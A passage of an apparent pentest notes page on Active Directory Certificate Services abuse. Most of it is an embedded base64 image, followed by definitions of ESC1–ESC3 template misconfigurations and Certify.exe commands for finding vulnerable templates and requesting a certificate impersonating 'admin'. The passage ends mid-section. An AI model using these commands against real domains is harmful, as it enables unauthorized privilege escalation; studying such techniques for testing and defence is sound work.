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" alt="image-1640805125672.png"></a></p>
<ul id="bkmrk-esc1-%3A-san-authorize"><li>
<strong>ESC1</strong> : SAN authorized &amp; Low Privileged Users can enroll &amp; Authentication EKU</li>
<li>
<strong>ESC2</strong> : Low Privileged Users can enroll &amp; Any or No EKU</li>
<li>
<strong>ESC3</strong> : Certificate Request Agent EKU &amp; Enrollment agent restrictions are not implemented on the CA
<ul><li>A template allows a low-privileged user to use an enrollment agent certificate.</li>
<li>Another template allows a low privileged user to use the enrollment agent certificate to request a certificate on behalf of another user, and the template defines an EKU that allows for domain authentication.</li>
</ul></li>
</ul><h4 id="bkmrk-template-misconfigur">Template misconfiguration - ESC1, 2 &amp; 3</h4>
<h5 id="bkmrk-windows-2">Windows</h5>
<h6 id="bkmrk-esc1-%26-2">ESC1 &amp; 2</h6>
<pre id="bkmrk-%23-find-vulnerable%2Fab"><code class="language-powershell"># Find vulnerable/abusable certificate templates using default low-privileged group
Certify.exe find /vulnerable

# Find vulnerable/abusable certificate templates using all groups the current user context is a part of:
Certify.exe find /vulnerable /currentuser

# Request certificate with SAN
Certify.exe request /ca:CA.contoso.local\CA /template:"Vulnerable template" /altname:"admin"

# Convert PEM to PFX (from Linux)
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out admin.pfx
</code></pre>
<p id="bkmrk-if-any-eku-but-no-cl">If <strong>ANY EKU</strong> but no Client Authentication, it can be used as en <strong>ESC3</strong>.</p>
<h6 id="bkmrk-esc2-%26-3">ESC2 &amp; 3</h6>
<pre id="bkmrk-%23-request-an-enrollm"><code class="language-powershell"># Request an enrollment agent certificate
Certify.exe request /ca:CA.contoso.local\CA /template:Vuln-EnrollAgentTemplate

# Request a certificate on behalf of another to a template that allow for domain authentication
